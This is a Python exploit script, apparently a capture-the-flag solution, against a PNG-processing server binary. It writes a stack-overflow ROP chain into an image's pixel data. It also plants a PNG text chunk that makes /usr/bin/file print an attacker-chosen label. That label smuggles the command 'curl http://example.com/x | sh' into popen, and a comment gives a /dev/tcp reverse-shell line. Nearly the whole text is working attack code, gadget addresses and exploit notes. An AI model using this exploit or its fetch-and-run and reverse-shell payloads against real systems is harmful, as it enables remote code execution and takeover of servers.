#
# Generate PNG containing a ropchain for the server binary,
# and also makes /usr/bin/file print controlled output.
#
# This controlled output is both checked by the server binary,
# and cointains data necessary for the exploit to work.
#

def hakpng(infile, outfile, label = 'THIS IS A TEST\0'):
  """Function to modify a PNG such that some versions of libmagic
  view it as a linux swap file. The /usr/bin/file utility will also
  print out the supplied label. This works on the Ubuntu 16.04
  versions of file."""

  import sys, struct, zlib

  f = open(infile, 'rb')
  of = open(outfile, 'wb')

  # PNG header
  of.write(f.read(8))

  def readchunk():
      header = f.read(8)
      if not header:
          return None
      n, type = struct.unpack('>I4s', header)
      data = f.read(n)
      crc, = struct.unpack('>I', f.read(4))

      assert crc == (zlib.crc32(type + data) & 0xffffffff)

      return type, data

  def writechunk(type, data):
      of.write(struct.pack('>I', len(data)))
      of.write(type)
      of.write(data)
      of.write(struct.pack('>I', (zlib.crc32(type + data) & 0xffffffff)))

  # IHDR
  writechunk(*readchunk())

  pos = of.tell() + 8
  payload = 'label\0'.ljust(1052 - pos, '*')
  payload += label
  payload = payload.ljust(4086 - pos, '*')
  payload += 'SWAPSPACE2'

  writechunk('tEXt', payload)

  while 1:
      c = readchunk()
      if c is None:
          break
      writechunk(*c)




'''
Exploit notes:

Bytes from the highest color-channel on the stack are 0x128 bytes away from the saved return pointer.

Binary has popen; e.g.
.text:0000000000400BBC                 mov     esi, 0x400F44 ; "r"
.text:0000000000400BC1                 mov     edi, offset command ; "/usr/bin/file "
.text:0000000000400BC6                 call    _popen ; 0x0400A30

popen output is read into here
.bss:0000000000602240 ; char haystack[1036]
.bss:0000000000602240 haystack        db 40Ch dup(?)

Gadgets:
0x0000000000400f23 : pop rdi ; ret
0x0000000000400f21 : pop rsi ; pop r15 ; ret
'''

# When /usr/bin/file prints out our hakpng() file, the text
# output has the `label` string at roughly this offset.
file_cb_output = 102

rop = [
  0x0000000000400f23, # pop rdi ; ret
  0x602240 + file_cb_output, # This ends up as "curl http://example.com/cb | sh; ..."
  0x0000000000400f21, # pop rsi ; pop r15 ; ret
  0x0400F44, # "r" for popen
  0, # r15 dummy
  0x0400A30, # popen()
]

import struct
rop = ''.join(struct.pack('<Q', i) for i in rop)

colorchannel = 0x128 * '\xff' + rop

# ljust so the image is wide enough for the overflow to occur.
# See server.c; the width of the image is important even though
# only the first bytes actually matter in the overflow.
colorchannel = colorchannel.ljust(len(colorchannel) * 256, '\xdd')
colorchannel = map(ord, colorchannel)

# Generate the a PNG; it's 1 pixel tall and len(colorchannel) wide.
from imread import imsave
import numpy
x = [ zip(colorchannel, colorchannel, colorchannel) ]
x = numpy.array(x, dtype=numpy.uint8)
imsave('/tmp/thicc.png', x)

# http://example.com/x contains a connect-back shell script, for example:
#   /bin/bash -c '/bin/bash -i >& /dev/tcp/your.ip.here/12345 0>&1'
PAYLOAD=" ; curl http://example.com/x | sh; GIF image data\x00"
hakpng('/tmp/thicc.png', '/tmp/hacc.png', label=PAYLOAD)

# $ cd /tmp; file image
# image: Linux/i386 swap file (new style), version 707406378 (4K pages), size 707406378 pages, LABEL= ; curl http://example.com/x | sh; GIF image data, UUID=2a2a2a2a-2a2a-2a2a-2a2a-2a2a2a2a2a2a
#
# Note that `file_cb_output` ends up being an index into this ^ string.
